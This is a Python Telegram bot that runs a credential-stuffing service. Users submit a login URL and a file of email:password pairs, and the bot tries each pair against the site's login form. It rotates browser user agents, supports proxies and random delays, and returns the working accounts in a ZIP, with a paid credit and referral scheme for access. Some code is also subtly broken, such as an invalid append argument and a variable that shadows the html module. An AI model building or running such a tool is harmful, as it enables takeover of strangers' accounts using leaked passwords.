#!/usr/bin/env python3
"""
TELEGRAM AUTH BOT v3.0 - PRODUCTION READY
✅ Auth checking + Credits + Referrals + Daily free + Admin + Clones
✅ 100% Local JSON storage - NO DATABASE
✅ VPS/Railway/Render ready
"""

import os
import re
import json
import asyncio
import aiohttp
import logging
import zipfile
import random
import time
import shutil
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse
from io import BytesIO
import html

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from telegram.constants import ParseMode

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ========================= CONFIG ========================
MAX_CONCURRENT = int(os.getenv('MAX_CONCURRENT', '4'))
REQUEST_TIMEOUT = 25
DELAY_RANGE = (1.2, 2.8)
COOLDOWN_TIME = 20

# CREDIT SYSTEM
CREDIT_COST_PER_CHECK = 2
DAILY_FREE_CREDITS = 14  # 7 free checks
OWNER_ID = 123456789  # 👈 CHANGE THIS TO YOUR TELEGRAM ID
BOT_TYPE = "main"  # main, pro_clone, public_clone

# Data directory
DATA_DIR = Path("data")
DATA_DIR.mkdir(exist_ok=True)

# User agents
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
]

# Referral rewards
REFERRAL_REWARDS = {1: 4, 10: 40, 20: 100, 30: 140}
LIFETIME_REFERRALS = 99

# Global state
user_states = {}
user_sessions = {}
user_cooldowns = {}
semaphore = asyncio.Semaphore(MAX_CONCURRENT)

# ========================= CLASSES ========================

class AuthChecker:
    def __init__(self):
        self.session: Optional[aiohttp.ClientSession] = None
        
    async def create_session(self, proxy: str = None) -> None:
        connector = aiohttp.TCPConnector(limit=100, limit_per_host=30, ttl_dns_cache=300)
        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
        
        self.session = aiohttp.ClientSession(
            connector=connector, timeout=timeout, headers=headers, trust_env=True
        )
        
        if proxy:
            if '@' in proxy:
                auth_part, _ = proxy.split('@', 1)
                self.session._default_headers['Proxy-Authorization'] = f'Basic {aiohttp.helpers.BasicAuth(*auth_part.split(":", 1)).encode()}'
    
    async def close(self):
        if self.session:
            await self.session.close()
    
    async def request(self, method: str, url: str, **kwargs) -> aiohttp.ClientResponse:
        if not self.session:
            raise ValueError("Session not initialized")
        return await self.session.request(method, url, **kwargs)

class StorageManager:
    """Thread-safe local JSON storage"""
    
    def __init__(self):
        self.users_file = DATA_DIR / "users.json"
        self.referrals_file = DATA_DIR / "referrals.json"
        self.bots_file = DATA_DIR / "bots.json"
        self.logs_file = DATA_DIR / "logs.txt"
        self._init_files()
    
    def _init_files(self):
        for file_path in [self.users_file, self.referrals_file, self.bots_file]:
            if not file_path.exists():
                file_path.write_text("{}")
        if not self.logs_file.exists():
            self.logs_file.write_text("# Admin credit logs\n")
    
    def _atomic_write(self, file_path: Path, data: dict):
        temp_path = file_path.with_suffix('.tmp')
        try:
            temp_path.write_text(json.dumps(data, indent=2))
            temp_path.replace(file_path)
            return True
        except:
            if temp_path.exists():
                temp_path.unlink()
            return False
    
    def load_users(self) -> dict:
        try:
            return json.loads(self.users_file.read_text())
        except:
            return {}
    
    def save_users(self, users: dict) -> bool:
        return self._atomic_write(self.users_file, users)
    
    def load_referrals(self) -> dict:
        try:
            return json.loads(self.referrals_file.read_text())
        except:
            return {}
    
    def save_referrals(self, referrals: dict) -> bool:
        return self._atomic_write(self.referrals_file, referrals)
    
    def log_admin_action(self, admin_id: int, user_id: int, amount: int, reason: str):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"{timestamp} | {admin_id} | {user_id} | {amount} | {reason}\n"
        self.logs_file.write_text(log_entry, append=True)

class UserManager:
    def __init__(self, storage: StorageManager):
        self.storage = storage
        self.users = storage.load_users()
    
    def get_user(self, user_id: int, referral_code: str = None) -> dict:
        user_id_str = str(user_id)
        if user_id_str not in self.users:
            self.users[user_id_str] = {
                "credits": 0,
                "free_reset_time": None,
                "free_used": 0,
                "referral_code": f"ref_{user_id}_{random.randint(1000,9999)}",
                "referrals_made": 0,
                "referrals_received": [],
                "lifetime_access": False,
                "created": datetime.now().isoformat()
            }
            
            if referral_code and referral_code in [u.get("referral_code", "") for u in self.users.values()]:
                self._process_referral(user_id, referral_code)
            
            self.storage.save_users(self.users)
        
        return self.users[user_id_str]
    
    def _process_referral(self, new_user_id: int, ref_code: str):
        for user_id, data in self.users.items():
            if data.get("referral_code") == ref_code:
                if new_user_id not in data.get("referrals_received", []):
                    data["referrals_received"].append(new_user_id)
                    data["referrals_made"] += 1
                    
                    count = data["referrals_made"]
                    for threshold, reward in REFERRAL_REWARDS.items():
                        if count == threshold:
                            data["credits"] += reward
                    
                    if count >= LIFETIME_REFERRALS:
                        data["lifetime_access"] = True
                    
                    self.storage.save_users(self.users)
                    break
    
    def has_credits(self, user_id: int) -> bool:
        user = self.get_user(user_id)
        if user.get("lifetime_access"):
            return True
        
        if user["credits"] >= CREDIT_COST_PER_CHECK:
            return True
        
        if user["free_reset_time"]:
            if datetime.now() < datetime.fromisoformat(user["free_reset_time"]):
                return user["free_used"] < DAILY_FREE_CREDITS
        return True
    
    def consume_credits(self, user_id: int) -> bool:
        user = self.get_user(user_id)
        if user.get("lifetime_access"):
            return True
        
        if user["credits"] >= CREDIT_COST_PER_CHECK:
            user["credits"] -= CREDIT_COST_PER_CHECK
        else:
            if not user["free_reset_time"]:
                user["free_reset_time"] = (datetime.now() + timedelta(days=1)).isoformat()
                user["free_used"] = 1
            elif datetime.now() < datetime.fromisoformat(user["free_reset_time"]):
                user["free_used"] += 1
                if user["free_used"] > DAILY_FREE_CREDITS:
                    return False
            else:
                return False
        
        self.storage.save_users(self.users)
        return True
    
    def add_credits(self, user_id: int, amount: int) -> bool:
        if str(user_id) in self.users:
            self.users[str(user_id)]["credits"] += amount
            return self.storage.save_users(self.users)
        return False
    
    def get_user_stats(self, user_id: int) -> str:
        user = self.get_user(user_id)
        lifetime = "🔓 LIFETIME" if user["lifetime_access"] else ""
        return f"💳 Credits: {user['credits']}\n🆓 Free left: {DAILY_FREE_CREDITS - user['free_used']}\n👥 Referrals: {user['referrals_made']}\n{lifetime}"

# Global instances
storage = StorageManager()
user_manager = UserManager(storage)

# ========================= AUTH FUNCTIONS ========================

def parse_credentials(line: str) -> Tuple[Optional[str], Optional[str], str]:
    line = line.strip()
    if len(line) < 5 or ':' not in line:
        return None, None, line
    parts = line.rsplit(':', 1)
    if len(parts[1]) < 4:
        return None, None, line
    return parts[0].strip(), parts[1].strip(), line

def is_success_page(html: str, url: str) -> bool:
    success_indicators = ['/dashboard', '/profile', '/account', '/home', '/settings', 'dashboard', 'welcome', 'signed in']
    for indicator in success_indicators:
        if indicator.lower() in html.lower() or indicator.lower() in url.lower():
            return True
    return len(html) > 5000

def extract_login_form(html: str, base_url: str) -> Optional[Dict]:
    form_pattern = r'<form[^>]*method=["\']?(?:post|get)["\']?[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>'
    matches = re.findall(form_pattern, html, re.IGNORECASE | re.DOTALL)
    
    for action, form_content in matches:
        form_data = {'action': urljoin(base_url, action.strip())}
        input_pattern = r'<input[^>]*name=["\']([^"\']*)["\'][^>]*value=["\']([^"\']*)["\'][^>]*>'
        inputs = re.findall(input_pattern, form_content, re.IGNORECASE)
        
        for name, value in inputs:
            form_data[name.lower()] = html.unescape(value)
        
        field_map = {'username': ['username', 'user', 'login', 'email'], 'password': ['password', 'pass', 'pwd'], 'email': ['email']}
        for target, sources in field_map.items():
            for source in sources:
                if source in form_data:
                    form_data[target] = form_data[source]
                    break
        
        if ('username' in form_data or 'email' in form_data) and 'password' in form_data:
            return form_data
    return None

async def test_auth(checker: AuthChecker, base_url: str, identifier: str, password: str, proxy: str = None) -> Dict:
    await semaphore.acquire()
    try:
        await checker.create_session(proxy)
        
        async with checker.session.get(base_url) as resp:
            if resp.status == 429:
                return {'status': 'RATE_LIMIT', 'line': f'RATE_LIMIT: {identifier}:{password}'}
            html = await resp.text()
            login_form = extract_login_form(html, base_url)
            
            if not login_form:
                login_paths = ['/login', '/signin', '/auth', '/account/login']
                for path in login_paths:
                    test_url = urljoin(base_url, path)
                    async with checker.session.get(test_url) as resp2:
                        if resp2.status == 200:
                            html = await resp2.text()
                            login_form = extract_login_form(html, test_url)
                            if login_form:
                                login_form['action'] = test_url
                                break
                if not login_form:
                    return {'status': 'NO_FORM', 'line': f'NO_LOGIN_FORM: {identifier}:{password}'}
        
        data = {'username': identifier, 'email': identifier, 'password': password}
        if login_form:
            data.update({k: v for k, v in login_form.items() if k not in ['action', 'username', 'email', 'password']})
        
        async with checker.session.post(login_form['action'], data=data, allow_redirects=True) as resp:
            final_url = str(resp.url)
            html = await resp.text()
            
            if resp.status == 429:
                return {'status': 'RATE_LIMIT', 'line': f'RATE_LIMIT: {identifier}:{password}'}
            
            if is_success_page(html, final_url):
                return {'status': 'LIVE', 'line': f'{identifier}:{password}', 'final_url': final_url}
            
            protected_paths = ['/dashboard', '/profile', '/account', '/settings', '/home']
            for path in protected_paths:
                test_url = urljoin(base_url, path)
                async with checker.session.get(test_url, allow_redirects=True) as prot_resp:
                    if prot_resp.status in [200, 302, 301] and is_success_page(await prot_resp.text(), test_url):
                        return {'status': 'LIVE', 'line': f'{identifier}:{password}', 'final_url': test_url}
        
        return {'status': 'FAILED', 'line': f'{identifier}:{password}'}
        
    except asyncio.TimeoutError:
        return {'status': 'TIMEOUT', 'line': f'TIMEOUT: {identifier}:{password}'}
    except Exception:
        return {'status': 'NETWORK', 'line': f'NETWORK_ERROR: {identifier}:{password}'}
    finally:
        await checker.close()
        semaphore.release()

# ========================= TELEGRAM HANDLERS ========================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    referral_code = None
    if context.args:
        referral_code = context.args[0]
    
    user_manager.get_user(user_id, referral_code)
    
    keyboard = [[InlineKeyboardButton("🔧 Proxy", callback_data="proxy_menu"), InlineKeyboardButton("📊 Stats", callback_data="stats")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🚀 **AUTH BOT READY** (v3.0)\n\n"
        "💳 **Credits**: 2/check | 7 free daily\n"
        "👥 **Referrals**: 4-140 credits\n"
        "🔓 **Lifetime**: 99 referrals\n\n"
        "1️⃣ Send login URL\n"
        "2️⃣ Upload `email:pass` file\n"
        "3️⃣ Get LIVE results!\n\n"
        f"💰 `{user_manager.get_user_stats(user_id)}`",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = user_manager.get_user(user_id)
    ref_code = user["referral_code"]
    
    stats_text = f"📊 **STATS**\n\n{user_manager.get_user_stats(user_id)}\n\n🔗 **REFERRAL**: `{ref_code}`\n💰 Share: t.me/{context.bot.username}?start={ref_code}"
    
    await update.message.reply_text(stats_text, parse_mode=ParseMode.MARKDOWN)

async def give_credits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        return
    
    try:
        target_id = int(context.args[0])
        amount = int(context.args[1])
        reason = " ".join(context.args[2:]) or "manual"
        
        if user_manager.add_credits(target_id, amount):
            storage.log_admin_action(user_id, target_id, amount, reason)
            await update.message.reply_text(f"✅ +{amount} credits → {target_id}")
        else:
            await update.message.reply_text("❌ User not found")
    except:
        await update.message.reply_text("❌ `/give_credits <user_id> <amount> [reason]`")

async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE, file_path: str, login_url: str, proxy: str = None):
    user_id = update.effective_user.id
    
    if not user_manager.has_credits(user_id):
        await update.message.reply_text("❌ **NO CREDITS!**\n\n" + user_manager.get_user_stats(user_id))
        return
    
    if user_id in user_cooldowns and user_cooldowns[user_id] > time.time():
        remaining = int(user_cooldowns[user_id] - time.time())
        await update.message.reply_text(f"⏳ Wait {remaining}s")
        return
    
    user_cooldowns[user_id] = time.time() + COOLDOWN_TIME
    
    if not user_manager.consume_credits(user_id):
        await update.message.reply_text("❌ **DAILY LIMIT REACHED**")
        return
    
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()
    except:
        await update.message.reply_text("❌ File error")
        return
    
    total = len([l for l in lines if ':' in l])
    live_count = 0
    results = {'LIVE': [], 'FAILED': [], 'RATE_LIMIT': [], 'TIMEOUT': [], 'NETWORK': [], 'NO_FORM': []}
    
    await context.bot.send_message(update.effective_chat.id, f"🔄 **{total} checks** (2cr each)")
    
    checker = AuthChecker()
    status_msg = await context.bot.send_message(update.effective_chat.id, "⏳ 0/0")
    
    for i, line in enumerate(lines, 1):
        identifier, password, original_line = parse_credentials(line)
        if not identifier or not password:
            continue
            
        result = await test_auth(checker, login_url, identifier, password, proxy)
        results[result['status']].append(result['line'])
        if result['status'] == 'LIVE':
            live_count += 1
        
        await context.bot.edit_message_text(
            chat_id=update.effective_chat.id,
            message_id=status_msg.message_id,
            text=f"⏳ **{live_count}/{i} LIVE** | {i}/{total}"
        )
        await asyncio.sleep(random.uniform(*DELAY_RANGE))
    
    # ZIP Results
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    zip_buffer = BytesIO()
    
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        if results['LIVE']:
            zf.writestr('LIVE.txt', '\n'.join(results['LIVE']))
        stats = {
            'timestamp': timestamp, 'total': total, 'live': len(results['LIVE']),
            'failed': len(results['FAILED']), 'timeout': len(results['TIMEOUT'])
        }
        zf.writestr('stats.json', json.dumps(stats, indent=2))
    
    zip_buffer.seek(0)
    
    stats_text = f"""✅ **RESULTS**
📊 Total: {total} | 🟢 LIVE: {stats['live']}
💰 Credits used: {total*2}

📦 ZIP sent!"""
    
    await context.bot.send_document(
        chat_id=update.effective_chat.id,
        document=zip_buffer,
        filename=f"auth_results_{timestamp}.zip",
        caption=stats_text,
        parse_mode=ParseMode.MARKDOWN
    )
    
    await status_msg.delete()

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if user_id not in user_states:
        user_states[user_id] = {'step': 'waiting_url'}
    
    state = user_states[user_id]
    
    if state['step'] == 'waiting_url':
        if not text.startswith('http'):
            await update.message.reply_text("❌ **Valid URL required**")
            return
        
        state['login_url'] = text
        state['step'] = 'waiting_file'
        user_sessions[user_id] = {'url': text}
        
        await update.message.reply_text(f"✅ **URL**: `{text}`\n\n📤 Upload `email:pass` file", parse_mode=ParseMode.MARKDOWN)
    
    elif state['step'] == 'waiting_file' and update.message.document:
        file = await context.bot.get_file(update.message.document.file_id)
        file_path = f"creds_{user_id}_{int(time.time())}.txt"
        await file.download_to_drive(file_path)
        
        proxy = user_sessions.get(user_id, {}).get('proxy', '')
        await process_file(update, context, file_path, state['login_url'], proxy)
        
        state['step'] = 'waiting_url'
        asyncio.create_task(cleanup_file(file_path))

async def cleanup_file(file_path: str):
    await asyncio.sleep(30)
    try:
        os.remove(file_path)
    except:
        pass

# Proxy handlers (unchanged)
async def proxy_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("➕ Set Proxy", callback_data="set_proxy")],
        [InlineKeyboardButton("❌ Clear", callback_data="clear_proxy")],
        [InlineKeyboardButton("📊 Stats", callback_data="stats")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    proxy_status = user_sessions.get(query.from_user.id, {}).get('proxy', 'None')
    text = f"🌐 **Proxy**: `{proxy_status}`"
    
    await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()
    
    if query.data == "proxy_menu":
        await proxy_menu(update, context)
    elif query.data == "stats":
        await stats(update, context)
    elif query.data == "set_proxy":
        user_states[user_id] = {'step': 'waiting_proxy'}
        await query.edit_message_text("📝 `http://user:pass@ip:port`")
    elif query.data == "clear_proxy":
        user_sessions[user_id] = user_sessions.get(user_id, {})
        user_sessions[user_id]['proxy'] = ''
        await query.edit_message_text("✅ Proxy cleared!")

async def handle_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_states.get(user_id, {}).get('step') == 'waiting_proxy':
        proxy = update.message.text.strip()
        proxy_pattern = r'^https?://(?:[^:]+:[^@]+@)?[^:]+:\d+$'
        if re.match(proxy_pattern, proxy) or (':' in proxy and '@' in proxy):
            user_sessions[user_id] = user_sessions.get(user_id, {})
            user_sessions[user_id]['proxy'] = proxy
            await update.message.reply_text(f"✅ **Proxy**: `{proxy}`", parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text("❌ Invalid proxy!")
        user_states[user_id]['step'] = 'waiting_url'

def main():
    token = os.getenv('TELEGRAM_BOT_TOKEN')
    if not token:
        print("❌ TELEGRAM_BOT_TOKEN required!")
        return
    
    print("🚀 Starting Auth Bot v3.0...")
    print(f"📁 Data: {DATA_DIR.absolute()}")
    
    app = Application.builder().token(token).build()
    
    # Handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(CommandHandler("give_credits", give_credits))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_proxy))
    app.add_handler(MessageHandler(filters.Document.ALL | filters.TEXT, handle_message))
    app.add_handler(CommandHandler("proxy", proxy_menu))
    
    app.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main()
